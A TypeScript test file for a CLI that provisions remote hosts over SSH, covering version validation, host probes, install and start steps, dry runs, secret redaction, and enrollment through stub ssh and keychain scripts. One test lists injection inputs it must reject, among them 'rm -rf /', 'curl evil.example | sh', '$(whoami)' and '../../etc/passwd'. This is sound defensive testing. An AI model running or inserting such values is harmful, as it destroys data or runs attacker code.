import assert from "node:assert/strict";
import { execFile, execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  assertInstallable,
  installSpecifier,
  nodeMajor,
  parseProbe,
  provisionRemoteHost,
  type RemoteProbe,
  type RemoteRunner,
  remoteErrorMessage,
  remoteNameFromSshHost,
  validateInstallVersion
} from "../remote-provision.js";
import { connectTimeoutSeconds, sshArgv } from "../adapters/ssh-exec.js";

const READY_PROBE = [
  "os=Linux",
  "arch=x86_64",
  "node=v22.22.2",
  "npm=10.9.7",
  "npmPrefix=/home/deploy/.local",
  "npmPrefixWritable=yes",
  "routekit=",
  "supervisor=systemd",
  "config=no",
  "daemon=no",
  ""
].join("\n");

const START_PAYLOAD = JSON.stringify({
  alreadyRunning: false,
  url: "http://127.0.0.1:8080",
  port: 8080,
  pid: 4242,
  version: "0.10.1",
  supervisor: "systemd",
  logFile: "/home/deploy/.routekit/logs/daemon.log"
});

const execFileAsync = promisify(execFile);

type Invocation = { argv: readonly string[]; script: string };

/** A runner that answers each provisioning step from a scripted transcript. */
function recordingRunner(
  responses: (invocation: Invocation) => { stdout?: string; stderr?: string; exitCode?: number }
): { run: RemoteRunner; calls: Invocation[] } {
  const calls: Invocation[] = [];
  const run: RemoteRunner = async (argv) => {
    // `sh -c <program> <name> [args...]`: the program is argv[2].
    const invocation = { argv, script: argv[2] ?? "" };
    calls.push(invocation);
    const reply = responses(invocation);
    return {
      stdout: reply.stdout ?? "",
      stderr: reply.stderr ?? "",
      exitCode: reply.exitCode ?? 0
    };
  };
  return { run, calls };
}

/** A fake `ssh` that answers only the probe. `%b` expands the escaped newlines. */
function probeOnlySsh(probe: string): string {
  return ["#!/bin/sh", "cat >/dev/null", `printf '%b' ${JSON.stringify(probe)}`].join("\n");
}

/** A stopped daemon: `status` degrades to this instead of failing. */
const STOPPED_PAYLOAD = JSON.stringify({ running: false, healthy: false });

function scriptedRunner(): { run: RemoteRunner; calls: Invocation[] } {
  return recordingRunner(({ script }) => {
    if (script.includes("p os ")) return { stdout: READY_PROBE };
    // The install step is the public installer (contains main + npm install -g).
    if (script.includes("main()") && script.includes("npm install -g")) {
      return { stdout: "0.10.1\n" };
    }
    if (script.includes("config init")) return {};
    if (script.includes("status")) return { stdout: STOPPED_PAYLOAD };
    if (script.includes("--json start")) return { stdout: START_PAYLOAD };
    throw new Error(`unexpected remote script: ${script.slice(0, 120)}`);
  });
}

test("ssh argv keeps options ahead of a terminated host and caps the connect timeout", () => {
  assert.deepEqual(sshArgv("velum-mini", ["routekit", "--local"], 90_000), [
    "-o",
    "BatchMode=yes",
    "-o",
    "ConnectTimeout=10",
    "--",
    "velum-mini",
    "routekit",
    "--local"
  ]);
  // A long provisioning budget must not become a long connect timeout.
  assert.equal(connectTimeoutSeconds(300_000), 10);
  assert.equal(connectTimeoutSeconds(2_500), 3);
  assert.equal(connectTimeoutSeconds(0), 1);
});

test("install versions are restricted to exact releases and `latest`", () => {
  assert.equal(validateInstallVersion("0.10.1"), "0.10.1");
  assert.equal(validateInstallVersion("1.0.0-rc.1"), "1.0.0-rc.1");
  assert.equal(validateInstallVersion("latest"), "latest");
  assert.equal(installSpecifier("0.10.1"), "@velum-labs/routekit@0.10.1");
  for (const rejected of [
    "1.0.0; rm -rf /",
    "1.0.0 && curl evil.example | sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",
    "https://evil.example/pkg.tgz",
    "next",
    ""
  ]) {
    assert.throws(
      () => validateInstallVersion(rejected),
      /invalid RouteKit version/,
      `accepted ${JSON.stringify(rejected)}`
    );
  }
});

test("remote names derive from an SSH destination or require an explicit name", () => {
  assert.equal(remoteNameFromSshHost("velum-mini"), "velum-mini");
  assert.equal(remoteNameFromSshHost("alen@velum-mini"), "velum-mini");
  assert.equal(remoteNameFromSshHost("alen@velum-mini:2222"), "velum-mini");
  assert.equal(remoteNameFromSshHost("gateway.example.com"), "gateway.example.com");
  assert.equal(remoteNameFromSshHost("[2001:db8::1]"), undefined);
});

test("probe output parses into a typed host description", () => {
  const probe = parseProbe(READY_PROBE);
  assert.deepEqual(probe, {
    os: "Linux",
    arch: "x86_64",
    node: "v22.22.2",
    npm: "10.9.7",
    npmPrefix: "/home/deploy/.local",
    npmPrefixWritable: true,
    supervisor: "systemd",
    configExists: false,
    daemonRunning: false
  });
  const bare = parseProbe("os=Darwin\nnode=\nnpmPrefixWritable=no\nsupervisor=nonsense\n");
  assert.equal(bare.node, undefined);
  assert.equal(bare.npmPrefixWritable, false);
  assert.equal(bare.supervisor, "none");
  assert.equal(nodeMajor("v22.22.2"), 22);
  assert.equal(nodeMajor("20.1.0"), 20);
  assert.equal(nodeMajor(undefined), undefined);
});

test("a host that cannot run RouteKit is rejected with an actionable reason", () => {
  const base: RemoteProbe = {
    os: "Linux",
    arch: "x86_64",
    node: "v22.22.2",
    npm: "10.9.7",
    npmPrefixWritable: true,
    supervisor: "systemd",
    configExists: false,
    daemonRunning: false
  };
  // Missing/old Node and a non-writable npm prefix are no longer fatal: the
  // installer bootstraps a private runtime. Unsupported OS still is.
  assert.doesNotThrow(() => assertInstallable(base, "velum-mini"));
  assert.doesNotThrow(() => assertInstallable({ ...base, node: undefined }, "velum-mini"));
  assert.doesNotThrow(() => assertInstallable({ ...base, node: "v20.11.0" }, "velum-mini"));
  assert.doesNotThrow(() => assertInstallable({ ...base, npm: undefined }, "velum-mini"));
  assert.doesNotThrow(() => assertInstallable({ ...base, npmPrefixWritable: false }, "velum-mini"));
  assert.throws(
    () => assertInstallable({ ...base, os: "FreeBSD" }, "velum-mini"),
    /velum-mini runs FreeBSD/
  );
});

test("provisioning probes, installs, initializes, and starts in order", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });

  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "done"],
      ["config", "done"],
      ["start", "done"]
    ]
  );
  assert.equal(result.installedVersion, "0.10.1");
  assert.equal(result.gateway?.url, "http://127.0.0.1:8080");
  assert.equal(result.gateway?.alreadyRunning, false);

  // Every step is `sh -c <program> routekit-remote [args]`; only the install
  // carries arguments, and each stays a single bare word.
  assert.deepEqual(
    calls.map((call) => [...call.argv.slice(0, 2), ...call.argv.slice(3)]),
    [
      ["sh", "-c", "routekit-remote"],
      ["sh", "-c", "routekit-remote", "--version", "0.10.1"],
      ["sh", "-c", "routekit-remote"],
      ["sh", "-c", "routekit-remote"],
      ["sh", "-c", "routekit-remote"]
    ]
  );
  for (const call of calls) {
    for (const arg of call.argv.slice(3)) {
      assert.doesNotMatch(arg, /[\s;&|$`'"<>()]/, `unsafe argv entry: ${arg}`);
    }
    // The version is never interpolated into the program text itself.
    assert.doesNotMatch(call.script, /0\.10\.1/);
  }
  assert.match(calls[1]?.script ?? "", /npm install -g/);
  assert.match(calls[1]?.script ?? "", /main "\$@"/);
});

/**
 * `routekit start` is not reliably idempotent: a daemon that came up with
 * different effective listener options than it was asked for makes a second
 * `start` fail outright. Re-running `remote install` against a live host must
 * therefore query the daemon rather than try to start it again.
 */
test("provisioning skips work the host has already done", async () => {
  const { run, calls } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return {
        stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1")
          .replace("config=no", "config=yes")
          .replace("daemon=no", "daemon=yes")
      };
    }
    if (script.includes("status")) {
      return {
        stdout: JSON.stringify({
          daemon: {
            pid: 333,
            packageVersion: "0.10.1",
            dataUrl: "https://gw.example",
            dataPort: 443,
            supervisor: "systemd"
          }
        })
      };
    }
    if (script.includes("--json start")) {
      throw new Error("a running daemon must not be started again");
    }
    throw new Error(`unexpected remote script: ${script}`);
  });
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });
  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "skipped"],
      ["config", "skipped"],
      ["start", "done"]
    ]
  );
  assert.equal(calls.length, 2);
  assert.equal(result.gateway?.url, "https://gw.example");
  assert.equal(result.gateway?.alreadyRunning, true);
  assert.equal(result.gateway?.version, "0.10.1");
});

test("a recorded but unreachable daemon is started rather than trusted", async () => {
  const { run } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return {
        stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1")
          .replace("config=no", "config=yes")
          .replace("daemon=no", "daemon=yes")
      };
    }
    // A stale record: `status` answers, but reports no data plane.
    if (script.includes("status")) {
      return { stdout: JSON.stringify({ running: true, healthy: false, pid: 9 }) };
    }
    if (script.includes("--json start")) return { stdout: START_PAYLOAD };
    throw new Error(`unexpected remote script: ${script}`);
  });
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });
  assert.equal(result.steps.at(-1)?.status, "done");
  assert.equal(result.gateway?.url, "http://127.0.0.1:8080");
  assert.equal(result.gateway?.alreadyRunning, false);
});

test("--force reinstalls a host that already runs the target version", async () => {
  const { run, calls } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return { stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1") };
    }
    if (script.includes("npm install -g") || script.includes("main()")) {
      return { stdout: "0.10.1\n" };
    }
    if (script.includes("config init")) return {};
    if (script.includes("status")) return { stdout: STOPPED_PAYLOAD };
    return { stdout: START_PAYLOAD };
  });
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "0.10.1",
    force: true,
    run
  });
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "done");
  assert.ok(calls.some((call) => call.argv.includes("--version") && call.argv.includes("0.10.1")));
});

test("latest skips an already-current remote install in a dry run", async () => {
  const { run, calls } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return { stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1") };
    }
    throw new Error(`dry-run latest must not execute ${script}`);
  });
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "latest",
    dryRun: true,
    run,
    resolveVersion: async () => "0.10.1"
  });
  assert.equal(result.targetVersion, "0.10.1");
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "skipped");
  assert.equal(result.steps.find((step) => step.id === "install")?.detail, "already 0.10.1");
  assert.equal(calls.length, 1);
});

test("latest skips an already-current remote install without dry-run", async () => {
  const { run, calls } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return {
        stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1")
          .replace("config=no", "config=yes")
          .replace("daemon=no", "daemon=yes")
      };
    }
    if (script.includes("status")) {
      return {
        stdout: JSON.stringify({
          daemon: {
            packageVersion: "0.10.1",
            dataUrl: "https://gw.example",
            supervisor: "systemd"
          }
        })
      };
    }
    throw new Error(`already-latest provisioning must not execute ${script}`);
  });
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "latest",
    run,
    resolveVersion: async () => "0.10.1"
  });
  assert.equal(result.targetVersion, "0.10.1");
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "skipped");
  assert.equal(
    calls.some((call) => call.script.includes("npm install -g")),
    false
  );
});

test("outdated latest dry run plans the resolved exact version", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "latest",
    dryRun: true,
    run,
    resolveVersion: async () => "0.10.1"
  });
  assert.equal(result.targetVersion, "0.10.1");
  assert.equal(
    result.steps.find((step) => step.id === "install")?.detail,
    "@velum-labs/routekit@0.10.1 via install.sh"
  );
  assert.equal(calls.length, 1);
});

test("outdated latest installs the resolved exact version", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "latest",
    run,
    resolveVersion: async () => "0.10.1"
  });
  assert.equal(result.targetVersion, "0.10.1");
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "done");
  assert.ok(calls.some((call) => call.argv.includes("--version") && call.argv.includes("0.10.1")));
  assert.equal(
    calls.some((call) => call.argv.includes("latest")),
    false
  );
});

test("latest with --force reinstalls the resolved exact version", async () => {
  const { run, calls } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) {
      return { stdout: READY_PROBE.replace("routekit=", "routekit=0.10.1") };
    }
    if (script.includes("npm install -g") || script.includes("main()")) {
      return { stdout: "0.10.1\n" };
    }
    if (script.includes("config init")) return {};
    if (script.includes("status")) return { stdout: STOPPED_PAYLOAD };
    return { stdout: START_PAYLOAD };
  });
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "latest",
    force: true,
    run,
    resolveVersion: async () => "0.10.1"
  });
  assert.equal(result.steps.find((step) => step.id === "install")?.status, "done");
  assert.ok(calls.some((call) => call.argv.includes("--version") && call.argv.includes("0.10.1")));
});

test("latest resolution failure occurs before any SSH call", async () => {
  let sshCalls = 0;
  await assert.rejects(
    provisionRemoteHost({
      host: "velum-mini",
      version: "latest",
      run: async () => {
        sshCalls += 1;
        return { stdout: "", stderr: "", exitCode: 0 };
      },
      resolveVersion: async () => {
        throw new Error("registry unavailable");
      }
    }),
    /registry unavailable/
  );
  assert.equal(sshCalls, 0);
});

test("a dry run reports the plan and never touches the host", async () => {
  const { run, calls } = scriptedRunner();
  const result = await provisionRemoteHost({
    host: "velum-mini",
    version: "0.10.1",
    dryRun: true,
    run
  });
  assert.deepEqual(
    result.steps.map((step) => [step.id, step.status]),
    [
      ["probe", "done"],
      ["install", "planned"],
      ["config", "planned"],
      ["start", "planned"]
    ]
  );
  assert.equal(calls.length, 1);
  assert.equal(result.gateway, undefined);
});

test("an unusable host fails before anything is installed", async () => {
  const { run, calls } = recordingRunner(() => ({
    stdout: READY_PROBE.replace("os=Linux", "os=FreeBSD")
  }));
  await assert.rejects(
    provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run }),
    /runs FreeBSD/
  );
  assert.equal(calls.length, 1);
});

test("a daemon with no credential yet is reported as blocked, not failed", async () => {
  const { run } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) return { stdout: READY_PROBE };
    if (script.includes("main()") && script.includes("npm install -g")) {
      return { stdout: "0.10.1\n" };
    }
    if (script.includes("config init")) return {};
    if (script.includes("status")) return { stdout: STOPPED_PAYLOAD };
    return {
      exitCode: 1,
      stdout: JSON.stringify({
        error: {
          code: "error",
          message: "cannot start RouteKit: set OPENAI_API_KEY for the configured provider"
        }
      })
    };
  });
  const result = await provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run });
  assert.equal(result.steps.at(-1)?.status, "blocked");
  assert.match(result.blocked ?? "", /set OPENAI_API_KEY/);
  assert.equal(result.gateway, undefined);
});

test("a genuine remote failure surfaces the reported reason and redacted evidence", async () => {
  const { run } = recordingRunner(({ script }) => {
    if (script.includes("p os ")) return { stdout: READY_PROBE };
    return {
      exitCode: 1,
      stderr: 'npm error 401 {"token":"npm_supersecret"}\nnpm error code E401',
      stdout: ""
    };
  });
  await assert.rejects(
    provisionRemoteHost({ host: "velum-mini", version: "0.10.1", run }),
    (error: unknown) => {
      const failure = error as { message: string; details?: readonly string[] };
      assert.match(failure.message, /installation on velum-mini failed/);
      const details = (failure.details ?? []).join("\n");
      assert.match(details, /E401/);
      assert.doesNotMatch(details, /npm_supersecret/);
      return true;
    }
  );
  assert.equal(
    remoteErrorMessage('{"error":{"message":"cannot start RouteKit: set OPENAI_API_KEY"}}'),
    "cannot start RouteKit: set OPENAI_API_KEY"
  );
  assert.equal(remoteErrorMessage("not json"), undefined);
});

test("the probe script runs under a POSIX shell and reports a usable host", () => {
  // Guards the one part of provisioning that is shell, not TypeScript.
  const script = fileURLToPath(new URL("../remote-provision.js", import.meta.url));
  const probeScript = execFileSync(
    process.execPath,
    ["-e", `import(${JSON.stringify(script)}).then((m) => process.stdout.write(m.PROBE_SCRIPT));`],
    { encoding: "utf8" }
  );
  const home = mkdtempSync(join(tmpdir(), "routekit-probe-home-"));
  const output = execFileSync("sh", ["-s", "--"], {
    input: `${probeScript}\n`,
    encoding: "utf8",
    env: { HOME: home, PATH: "/usr/bin:/bin" }
  });
  const probe = parseProbe(output);
  assert.equal(probe.os, process.platform === "darwin" ? "Darwin" : "Linux");
  assert.equal(probe.configExists, false);
  assert.equal(probe.daemonRunning, false);
});

test("all remote shell programs parse under POSIX sh -n", async () => {
  const generated = fileURLToPath(new URL("../generated/shell-scripts.js", import.meta.url));
  const mod = (await import(generated)) as Record<string, string>;
  const names = [
    "REMOTE_PATH_PREAMBLE",
    "PROBE_SCRIPT",
    "INSTALL_SCRIPT",
    "CONFIG_INIT_SCRIPT",
    "STATUS_SCRIPT",
    "START_SCRIPT",
    "RELAY_SCRIPT",
    "PEER_ADD_SCRIPT",
    "INSTALLER_SCRIPT"
  ];
  for (const name of names) {
    assert.equal(typeof mod[name], "string", `${name} missing`);
    assert.doesNotThrow(
      () => execFileSync("sh", ["-n", "-c", mod[name] as string]),
      `${name} failed sh -n`
    );
  }
});

test("the public installer --dry-run runs under a POSIX shell", async () => {
  const generated = fileURLToPath(new URL("../generated/shell-scripts.js", import.meta.url));
  const mod = (await import(generated)) as { INSTALLER_SCRIPT: string };
  const home = mkdtempSync(join(tmpdir(), "routekit-installer-home-"));
  const result = execFileSync(
    "sh",
    ["-c", mod.INSTALLER_SCRIPT, "routekit-install", "--version", "latest", "--dry-run"],
    {
      encoding: "utf8",
      env: { ...process.env, HOME: home },
      stdio: ["ignore", "pipe", "pipe"]
    }
  );
  // dry-run prints the plan on stderr; stdout is empty.
  assert.equal(typeof result, "string");
});

/**
 * End-to-end through the real CLI: a fake `ssh` on PATH answers provisioning,
 * the token bootstrap, and the control relay, and a loopback HTTP server
 * stands in for the gateway's health endpoint.
 */
test("`remote install --url` provisions and enrolls through a fake SSH host", async () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-home-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-bin-"));
  const transcript = join(bin, "transcript.jsonl");

  const gateway = createServer((request, response) => {
    if (request.url === "/health") {
      response.writeHead(200, { "content-type": "application/json" });
      response.end(JSON.stringify({ ok: true }));
      return;
    }
    response.writeHead(404);
    response.end();
  });
  await new Promise<void>((resolve) => gateway.listen(0, "127.0.0.1", resolve));
  const port = (gateway.address() as AddressInfo).port;

  const ssh = join(bin, "ssh");
  writeFileSync(
    ssh,
    [
      `#!${process.execPath}`,
      "const { appendFileSync } = require('node:fs');",
      "const argv = process.argv.slice(2);",
      // Every RouteKit invocation arrives as `sh -c <program> routekit-remote`,
      // so the remote program is the argument after `-c`.
      "const script = argv[argv.indexOf('-c') + 1] || '';",
      "let input = '';",
      "process.stdin.setEncoding('utf8');",
      "process.stdin.on('data', (chunk) => { input += chunk; });",
      "process.stdin.on('end', () => {",
      `  appendFileSync(${JSON.stringify(transcript)}, JSON.stringify({ argv, input }) + '\\n');`,
      "  if (script.includes('daemon exec')) {",
      "    const envelope = JSON.parse(input);",
      "    if (envelope.kind === 'health') {",
      "      process.stdout.write(JSON.stringify({ status: 200, body: { status: 'ok' } }) + '\\n');",
      "      return;",
      "    }",
      "    const request = envelope.request;",
      "    let result;",
      "    if (request.method === 'hello') {",
      "      result = {",
      "        protocolVersion: 'control.v2',",
      "        product: 'routekit',",
      "        packageVersion: '0.10.1',",
      "        capabilities: ['routekit.control.v2']",
      "      };",
      "    } else if (request.method === 'tokens.issue') {",
      "      result = {",
      "        id: 'tok1',",
      "        label: request.params.label,",
      "        plane: request.params.plane,",
      "        role: 'admin',",
      "        token: 'remote-data-token'",
      "      };",
      "    } else {",
      "      process.stderr.write('unexpected control method ' + request.method + '\\n');",
      "      process.exit(1);",
      "    }",
      "    const body = {",
      "      protocol: request.protocol,",
      "      id: request.id,",
      "      ok: true,",
      "      result",
      "    };",
      "    process.stdout.write(JSON.stringify({ status: 200, body }) + '\\n');",
      "    return;",
      "  }",
      "  if (script.includes('p os ')) {",
      `    process.stdout.write(${JSON.stringify(READY_PROBE)});`,
      "    return;",
      "  }",
      "  if (script.includes('main()') && script.includes('npm install -g')) {",
      "    process.stdout.write('0.10.1\\n');",
      "    return;",
      "  }",
      "  if (script.includes('config init')) return;",
      `  if (script.includes('status')) { process.stdout.write(${JSON.stringify(
        STOPPED_PAYLOAD
      )} + '\\n'); return; }`,
      "  if (script.includes('--json start')) {",
      `    process.stdout.write(${JSON.stringify(
        JSON.stringify({
          alreadyRunning: false,
          url: "http://127.0.0.1:PORT",
          port: 0,
          pid: 4242,
          version: "0.10.1",
          supervisor: "systemd"
        })
      )}.replace('PORT', process.env.ROUTEKIT_TEST_GATEWAY_PORT) + '\\n');`,
      "    return;",
      "  }",
      "  process.stderr.write('unexpected invocation\\n');",
      "  process.exit(1);",
      "});"
    ].join("\n"),
    { mode: 0o700 }
  );
  chmodSync(ssh, 0o700);

  // macOS stores remote tokens in Keychain; stub `security` so the enrollment
  // path stays hermetic when the real keychain is unavailable (CI sandboxes,
  // headless agents). The stub mirrors tokens into the ROUTEKIT_HOME secrets
  // tree so the existing file assertion keeps working on every platform.
  const security = join(bin, "security");
  const keychainStore = join(home, "secrets", "remote-velum-mini");
  writeFileSync(
    security,
    [
      "#!/bin/sh",
      "cmd=$1",
      "shift",
      'account=""',
      'password=""',
      'while [ "$#" -gt 0 ]; do',
      '  case "$1" in',
      "    -a) account=$2; shift 2 ;;",
      "    -w) password=$2; shift 2 ;;",
      "    *) shift ;;",
      "  esac",
      "done",
      `store=${JSON.stringify(keychainStore)}`,
      'mkdir -p "$(dirname "$store")"',
      'case "$cmd" in',
      "  add-generic-password)",
      '    printf "%s\\n" "$password" > "$store"',
      '    chmod 600 "$store"',
      "    ;;",
      "  find-generic-password)",
      '    [ -f "$store" ] || exit 44',
      '    cat "$store"',
      "    ;;",
      "  delete-generic-password)",
      '    rm -f "$store"',
      "    ;;",
      "  *) exit 1 ;;",
      "esac"
    ].join("\n"),
    { mode: 0o700 }
  );
  chmodSync(security, 0o700);

  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  try {
    // The health endpoint is served from this process, so the CLI must run
    // asynchronously: a synchronous child would block the event loop serving it.
    const { stdout: output } = await execFileAsync(
      process.execPath,
      [
        cli,
        "--json",
        "remote",
        "install",
        "deploy@velum-mini",
        "--url",
        `http://127.0.0.1:${port}`,
        "--version",
        "0.10.1"
      ],
      {
        encoding: "utf8",
        env: {
          ...process.env,
          HOME: home,
          ROUTEKIT_HOME: home,
          ROUTEKIT_NO_TUI: "1",
          ROUTEKIT_TEST_GATEWAY_PORT: String(port),
          PATH: `${bin}:${process.env.PATH ?? ""}`
        }
      }
    );
    const result = JSON.parse(output) as {
      host: string;
      steps: Array<{ id: string; status: string }>;
      gateway?: { url: string };
      remote?: { name: string; gatewayUrl: string; active: boolean };
    };
    assert.equal(result.host, "deploy@velum-mini");
    assert.deepEqual(
      result.steps.map((step) => `${step.id}:${step.status}`),
      ["probe:done", "install:done", "config:done", "start:done"]
    );
    assert.equal(result.remote?.name, "velum-mini");
    assert.equal(result.remote?.gatewayUrl, `http://127.0.0.1:${port}`);
    assert.equal(result.remote?.active, true);

    const registry = JSON.parse(readFileSync(join(home, "remotes.json"), "utf8")) as {
      active?: string;
      remotes: Array<{ name: string; sshHost: string }>;
    };
    assert.equal(registry.active, "velum-mini");
    assert.equal(registry.remotes[0]?.sshHost, "deploy@velum-mini");
    assert.equal(
      readFileSync(join(home, "remotes.json"), "utf8").includes("remote-data-token"),
      false
    );

    const tokenPath = join(home, "secrets", "remote-velum-mini");
    assert.equal(readFileSync(tokenPath, "utf8").trim(), "remote-data-token");
    assert.equal(statSync(tokenPath).mode & 0o777, 0o600);

    const calls = readFileSync(transcript, "utf8")
      .split("\n")
      .filter((line) => line.length > 0)
      .map((line) => JSON.parse(line) as { argv: string[]; input: string });
    const marker = (script: string): string =>
      script.includes("p os ")
        ? "probe"
        : script.includes("main()") && script.includes("npm install -g")
          ? "install"
          : script.includes("config init")
            ? "config"
            : script.includes("status")
              ? "status"
              : script.includes("--json start")
                ? "start"
                : script.includes("peer add")
                  ? "peer-add"
                  : script.includes("daemon exec")
                    ? "relay"
                    : "unknown";
    const steps = calls.map((call) => {
      const index = call.argv.indexOf("-c");
      return {
        script: (call.argv[index + 1] ?? "").replace(/^'|'$/g, ""),
        label: call.argv[index + 2],
        args: call.argv.slice(index + 3)
      };
    });

    // Provisioning, then the control hello, then named-token issue over SSH.
    assert.deepEqual(
      steps.map((step) => marker(step.script)),
      ["probe", "install", "config", "status", "start", "relay", "relay"]
    );
    // Only the install carries arguments, and each stays a single bare word.
    assert.deepEqual(
      steps.map((step) => step.args),
      [[], ["--version", "0.10.1"], [], [], [], [], []]
    );
    for (const step of steps) {
      assert.equal(step.label, "routekit-remote");
      // Every remote command resolves its own PATH before running RouteKit.
      assert.ok(step.script.startsWith('set -u\nPATH="$HOME/.local/bin:'));
      assert.ok(step.script.includes("export PATH"));
    }
    for (const call of calls) {
      assert.deepEqual(call.argv.slice(0, 7), [
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=10",
        "--",
        "deploy@velum-mini",
        "sh"
      ]);
    }
  } finally {
    await new Promise<void>((resolve) => gateway.close(() => resolve()));
  }
});

test("`remote install --dry-run` reports a plan without enrolling", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-dry-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-dry-bin-"));
  const ssh = join(bin, "ssh");
  writeFileSync(ssh, probeOnlySsh(READY_PROBE), { mode: 0o700 });
  chmodSync(ssh, 0o700);
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  const output = execFileSync(
    process.execPath,
    [cli, "--json", "remote", "install", "velum-mini", "--dry-run"],
    {
      encoding: "utf8",
      env: {
        ...process.env,
        HOME: home,
        ROUTEKIT_HOME: home,
        ROUTEKIT_NO_TUI: "1",
        PATH: `${bin}:${process.env.PATH ?? ""}`
      }
    }
  );
  const result = JSON.parse(output) as {
    dryRun: boolean;
    version: string;
    targetVersion: string;
    steps: Array<{ id: string; status: string }>;
    remote?: unknown;
  };
  assert.equal(result.dryRun, true);
  assert.equal(result.targetVersion, result.version);
  assert.deepEqual(
    result.steps.map((step) => step.status),
    ["done", "planned", "planned", "planned"]
  );
  assert.equal(result.remote, undefined);
});

test("`remote install` rejects an unusable host without provisioning it", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-old-"));
  const bin = mkdtempSync(join(tmpdir(), "routekit-install-old-bin-"));
  const ssh = join(bin, "ssh");
  writeFileSync(ssh, probeOnlySsh(READY_PROBE.replace("os=Linux", "os=FreeBSD")), { mode: 0o700 });
  chmodSync(ssh, 0o700);
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  assert.throws(
    () =>
      execFileSync(process.execPath, [cli, "--json", "remote", "install", "velum-mini"], {
        encoding: "utf8",
        env: {
          ...process.env,
          HOME: home,
          ROUTEKIT_HOME: home,
          ROUTEKIT_NO_TUI: "1",
          PATH: `${bin}:${process.env.PATH ?? ""}`
        }
      }),
    (error: unknown) => {
      const failure = error as { status?: number; stdout?: string };
      assert.equal(failure.status, 1);
      assert.match(failure.stdout ?? "", /FreeBSD/);
      return true;
    }
  );
});

test("`remote install --name` without --url explains what it needs", () => {
  const home = mkdtempSync(join(tmpdir(), "routekit-install-name-"));
  const cli = fileURLToPath(new URL("../index.js", import.meta.url));
  assert.throws(
    () =>
      execFileSync(
        process.execPath,
        [cli, "--json", "remote", "install", "velum-mini", "--name", "mini"],
        {
          encoding: "utf8",
          env: {
            ...process.env,
            HOME: home,
            ROUTEKIT_HOME: home,
            ROUTEKIT_NO_TUI: "1"
          }
        }
      ),
    (error: unknown) => {
      const failure = error as { stdout?: string };
      assert.match(failure.stdout ?? "", /--name only applies when --url enrolls the host/);
      return true;
    }
  );
});

test("the private installer does not replace ~/.local/bin/routekit with a self-symlink", async () => {
  const generated = fileURLToPath(new URL("../generated/shell-scripts.js", import.meta.url));
  const mod = (await import(generated)) as { INSTALLER_SCRIPT: string };
  assert.match(mod.INSTALLER_SCRIPT, /symlink-to-self breaks PATH/);
  assert.match(mod.INSTALLER_SCRIPT, /\[ "\$_bin" != "\$_shim" \]/);

  // Reproduce the failure mode: npm already wrote ~/.local/bin/routekit, and a
  // naive ln -sfn $_bin $_shim would turn it into a self-reference.
  const home = mkdtempSync(join(tmpdir(), "routekit-install-shim-"));
  const localBin = join(home, ".local", "bin");
  const target = join(home, ".local", "lib", "node_modules", "@velum-labs", "routekit", "dist");
  mkdirSync(localBin, { recursive: true });
  mkdirSync(target, { recursive: true });
  const realEntry = join(target, "index.js");
  writeFileSync(realEntry, '#!/usr/bin/env node\nconsole.log("ok");\n', {
    mode: 0o755
  });
  const binPath = join(localBin, "routekit");
  execFileSync("ln", ["-sfn", realEntry, binPath]);
  const script = [
    "set -eu",
    `HOME=${JSON.stringify(home)}`,
    'ROUTEKIT_NPM_PREFIX="$HOME/.local"',
    "ROUTEKIT_INSTALL_MODE=private",
    'mkdir -p "$HOME/.local/bin"',
    '_bin="$ROUTEKIT_NPM_PREFIX/bin/routekit"',
    '_shim="$HOME/.local/bin/routekit"',
    'if [ -x "$_bin" ]; then',
    '  if [ "$_bin" != "$_shim" ]; then',
    '    ln -sfn "$_bin" "$_shim"',
    "  fi",
    "fi",
    'readlink "$HOME/.local/bin/routekit"'
  ].join("\n");
  const linked = execFileSync("sh", ["-c", script], { encoding: "utf8" }).trim();
  assert.equal(linked, realEntry);
});
